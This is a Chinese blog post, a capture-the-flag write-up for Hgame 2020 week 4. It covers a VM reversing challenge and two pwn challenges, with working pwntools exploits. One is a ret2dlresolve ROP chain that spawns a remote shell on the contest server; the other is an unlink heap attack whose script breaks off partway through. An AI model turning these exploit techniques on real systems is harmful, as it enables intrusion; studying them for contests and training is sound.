@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="NkA6ndXFZC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.xi4oyu.top","root":"/","images":"/images","scheme":"Gemini","version":"8.7.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="（太难了这周，缩圈效果极佳）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame-week4-writeup">
+<meta property="og:url" content="http://www.xi4oyu.top/6a7c8d32/index.html">
+<meta property="og:site_name" content="feather&#39;s blog">
+<meta property="og:description" content="（太难了这周，缩圈效果极佳）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.xi4oyu.top/images/6a7c8d32/re-1-2.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/6a7c8d32/re-1-1.png">
+<meta property="og:image" content="http://www.xi4oyu.top/images/6a7c8d32/re-1-3.png">
+<meta property="article:published_time" content="2020-02-15T15:37:00.000Z">
+<meta property="article:modified_time" content="2020-02-15T15:37:00.000Z">
+<meta property="article:author" content="feather">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.xi4oyu.top/images/6a7c8d32/re-1-2.png">
+
+
+<link rel="canonical" href="http://www.xi4oyu.top/6a7c8d32/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.xi4oyu.top/6a7c8d32/","path":"6a7c8d32/","title":"Hgame-week4-writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hgame-week4-writeup | feather's blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="feather's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">feather's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Re"><span class="nav-number">1.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easyVM"><span class="nav-number">1.1.</span> <span class="nav-text">easyVM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">2.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP-LEVEL5"><span class="nav-number">2.1.</span> <span class="nav-text">ROP_LEVEL5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Annevi-Note2"><span class="nav-number">2.2.</span> <span class="nav-text">Annevi_Note2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="feather" src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">feather</p>
+  <div class="site-description" itemprop="description">计算机技术&个人琐碎事</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/featherl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;featherl" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:featherm@126.com" title="E-Mail → mailto:featherm@126.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0x4qe.github.io/" title="https:&#x2F;&#x2F;0x4qe.github.io&#x2F;" rel="noopener" target="_blank">0x4qE</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wzyxv1n.top/" title="https:&#x2F;&#x2F;wzyxv1n.top&#x2F;" rel="noopener" target="_blank">转爷</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://github.red/" title="https:&#x2F;&#x2F;github.red&#x2F;" rel="noopener" target="_blank">茄皇</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://fl0.top/" title="http:&#x2F;&#x2F;fl0.top&#x2F;" rel="noopener" target="_blank">qz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://legr4ndk.github.io/" title="https:&#x2F;&#x2F;legr4ndk.github.io&#x2F;" rel="noopener" target="_blank">Legrandk</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.thesoldierjack.cn/" title="https:&#x2F;&#x2F;www.thesoldierjack.cn&#x2F;" rel="noopener" target="_blank">digger</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wr-web.github.io/" title="https:&#x2F;&#x2F;wr-web.github.io&#x2F;" rel="noopener" target="_blank">wr</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://annevi.cn/" title="https:&#x2F;&#x2F;annevi.cn&#x2F;" rel="noopener" target="_blank">annevi</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.zhouweitong.site/" title="http:&#x2F;&#x2F;www.zhouweitong.site&#x2F;" rel="noopener" target="_blank">obj</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.wz22.cc/" title="https:&#x2F;&#x2F;blog.wz22.cc&#x2F;" rel="noopener" target="_blank">Moesang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.liki.link/" title="https:&#x2F;&#x2F;me.liki.link&#x2F;" rel="noopener" target="_blank">kg</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cosmos.red/" title="https:&#x2F;&#x2F;cosmos.red&#x2F;" rel="noopener" target="_blank">boss-c</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jacksonyu1334.github.io/" title="https:&#x2F;&#x2F;jacksonyu1334.github.io" rel="noopener" target="_blank">jackson</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://cjovi.icu/" title="https:&#x2F;&#x2F;cjovi.icu&#x2F;" rel="noopener" target="_blank">cj</a>
+        </li>
+    </ul>
+  </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.xi4oyu.top/6a7c8d32/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="feather">
+      <meta itemprop="description" content="计算机技术&个人琐碎事">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="feather's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hgame-week4-writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-02-15 23:37:00" itemprop="dateCreated datePublished" datetime="2020-02-15T23:37:00+08:00">2020-02-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/hgame-2020/" itemprop="url" rel="index"><span itemprop="name">hgame-2020</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>（太难了这周，缩圈效果极佳）</p>
+<span id="more"></span>
+
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easyVM"><a href="#easyVM" class="headerlink" title="easyVM"></a>easyVM</h3><p>简单处理下后，这题把你的输入经过一个虚拟机的操作变化后，与设定的结果比较，一致则成功，输入就是flag</p>
+<p><img src="/images/6a7c8d32/re-1-2.png" alt="2"></p>
+<p>虚拟机执行的指令如下：</p>
+<p><img src="/images/6a7c8d32/re-1-1.png" alt="1"></p>
+<p>分析handler函数，整理好操作的意图，大概有push压栈操作，pop出栈操作，还有一些运算，但是我还是看不太懂，最后动态调试，发现关键步骤在这里：</p>
+<p><img src="/images/6a7c8d32/re-1-3.png" alt="3"></p>
+<p>这个异或操作，再结合几条指令，发现就是改变输入的字符串的过程，而且就是把输入与一串固定不变的key进行异或而已，那么问题就简单了，全部输入<code>\0</code>，当然这个输入没法直接键盘输入，我直接在ida上改的，然后最后比较时的字符串就是我想要的key，再与dest异或就可以得出正确的flag了</p>
+<p>dump出key和dest后，写了个脚本来计算，如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
+
+s1 <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'52334E474A4D676947706A362A51362A5E3654674E2340755E643361384B32485647764F63712459'</span><span class="token punctuation">)</span>
+s2 <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'3A542F2A2F3613012E033540470E5F59016927083D4C331A2D0B400E4B2441272528292A02025D24'</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span> c1<span class="token operator">^</span>c2 <span class="token keyword">for</span> c1<span class="token punctuation">,</span>c2 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span>s2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+flag <span class="token operator">=</span> xor<span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="ROP-LEVEL5"><a href="#ROP-LEVEL5" class="headerlink" title="ROP_LEVEL5"></a>ROP_LEVEL5</h3><p>32位程序，没有输出流，没法leak，然后了解到一个不用leak的技术！——ret2dlresolve<br>比较难，涉及到一个延迟绑定的概念，这里就贴两篇文章参考：</p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/elvirangel/p/8994799.html">https://www.cnblogs.com/elvirangel/p/8994799.html</a><br><a target="_blank" rel="external nofollow noopener noreferrer" href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
+<p>我的exp如下，可以结合文章和我的注释看看：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
+<span class="token comment">#coding=utf8</span>
+
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ROP5'</span><span class="token punctuation">)</span>
+<span class="token comment">#io = elf.process()</span>
+io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20700</span><span class="token punctuation">)</span>
+
+bss_buf_addr <span class="token operator">=</span> <span class="token number">0x804A060</span>
+pop_3_ret <span class="token operator">=</span> <span class="token number">0x080485d9</span>
+pop_ebp_ret <span class="token operator">=</span> <span class="token number">0x080485db</span>
+leave_ret <span class="token operator">=</span> <span class="token number">0x804855A</span>
+new_stack <span class="token operator">=</span> bss_buf_addr <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token comment"># bss段前面大部分是不可写或者重要的数据</span>
+
+<span class="token comment"># 构造好read，用于读入数据到new_stack</span>
+offset <span class="token operator">=</span> <span class="token number">0x48</span> <span class="token comment"># padding_len</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> offset  <span class="token comment"># padding</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_3_ret<span class="token punctuation">)</span> <span class="token comment"># read后的返回地址，把下面三个参数给pop走,平衡栈</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># stdin</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>new_stack<span class="token punctuation">)</span> <span class="token comment"># 读入到new_stack中</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment"># 读入数据的长度</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebp_ret<span class="token punctuation">)</span> <span class="token comment"># pop new_stack到rbp</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>new_stack<span class="token punctuation">)</span> 
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token comment"># 栈迁移</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Are you the LEVEL5?\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+
+bin_sh_str <span class="token operator">=</span> <span class="token string">'/bin/sh 1>&amp;0\x00'</span> <span class="token comment"># system的参数</span>
+plt_0 <span class="token operator">=</span> <span class="token number">0x08048380</span> <span class="token comment"># plt表第0项，这是延迟绑定第一步的入口</span>
+
+
+<span class="token comment"># 伪造的Elf32_Sym和Elf32_Rel </span>
+dynsym_addr <span class="token operator">=</span> <span class="token number">0x80481d8</span>
+dynstr_addr <span class="token operator">=</span> <span class="token number">0x8048278</span>
+rel_plt <span class="token operator">=</span> <span class="token number">0x8048330</span>
+
+fake_rel_addr <span class="token operator">=</span> new_stack<span class="token operator">+</span><span class="token number">0x14</span>  <span class="token comment"># 伪造的Elf32_Rel的地址</span>
+
+<span class="token comment"># 伪造Elf32_Sym所处的地址</span>
+fake_sym_addr <span class="token operator">=</span> fake_rel_addr<span class="token operator">+</span><span class="token number">0x8</span> <span class="token comment"># 0x14+0x8(fake_rel的大小)</span>
+align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym_addr<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment"># sym结构体的位置要0x10对齐</span>
+fake_sym_addr <span class="token operator">+=</span> align
+
+<span class="token comment"># 伪造的Elf32_Sym在dynsym_addr指向的数组里的下标</span>
+sym_index <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym_addr<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x10</span>
+
+<span class="token comment"># Elf32_Rel的r_info字段</span>
+r_info <span class="token operator">=</span> sym_index <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token operator">|</span> <span class="token number">0x7</span>
+
+<span class="token comment"># 伪造的Elf32_Rel</span>
+fake_rel <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>  <span class="token comment"># r_offset,r_info  找到的函数地址会填到r_offset处</span>
+
+<span class="token comment"># 函数名字符串的地址</span>
+fake_str_addr <span class="token operator">=</span> fake_sym_addr<span class="token operator">+</span><span class="token number">0x10</span>
+
+<span class="token comment"># 字符串的偏移</span>
+st_name <span class="token operator">=</span> fake_str_addr <span class="token operator">-</span> dynstr_addr 
+
+<span class="token comment"># 伪造的Elf32_Sym</span>
+fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span> <span class="token comment"># st_name,not important</span>
+
+<span class="token comment"># 用于寻找Elf32_Rel结构体的偏移量</span>
+rel_offset <span class="token operator">=</span> fake_rel_addr <span class="token operator">-</span> rel_plt <span class="token comment"># fake_rel_addr指向fake_rel</span>
+
+
+<span class="token comment"># 构造ROP</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token comment"># 这个是给上面leave指令中的pop rbp这一步 </span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>rel_offset<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> <span class="token string">'aaaa'</span> <span class="token comment"># 返回地址</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>new_stack <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token comment"># binsh_str的地址</span>
+payload <span class="token operator">+=</span> fake_rel   <span class="token comment"># 这里的地址是(new_stack+0x14)</span>
+payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> align
+payload <span class="token operator">+=</span> fake_sym
+payload <span class="token operator">+=</span> <span class="token string">'system\x00'</span>  <span class="token comment"># 这里的地址是fake_sym_addr+0x10</span>
+payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x50</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> bin_sh_str
+
+
+<span class="token comment">#gdb.attach(io)</span>
+
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="Annevi-Note2"><a href="#Annevi-Note2" class="headerlink" title="Annevi_Note2"></a>Annevi_Note2</h3><p>其实这题和week3的Annevi_Note差不多，唯一的区别就是关闭了标准输出，没法leak。</p>
+<p>查到资料了解到，bss段最开头有三个全局变量（有时候是两个）：stdin，stdout，stderr</p>
+<p>这三个全局变量是IO_FILE结构体的指针，详细的就不说了（毕竟我还没学完），特别注意的是，printf函数使用的是stdout这个指针（puts函数呢不使用这个），因为关闭的是stdout，stderr没有被关闭，可以修改stdout这个指针的值为stderr的值，这样printf函数的输出就可以接收到了，而且程序中的show的处理就是用printf的。</p>
+<p>stdout和stderr的值其实只有12bit之差，而且因为libc的基址最低12bit必定全为0（这大概是物理页对齐为0x1000的原因），所以stdin和stderr的最低12bit是完全固定的，就是偏移量的最低12bit。</p>
+<p>由unlink造成任意地址写，可以修改stdout的值最低12bit为stderr的，但是写入按照字节为单位写入，所以还有4bit要爆破，概率还是蛮大的。</p>
+<p>输出打开后，leak出libc基址，计算system函数的地址后，劫持atoi函数got项getshell</p>
+<p>exp如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
+<span class="token comment">#coding=utf8</span>
+
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcher
+
+context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
+context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
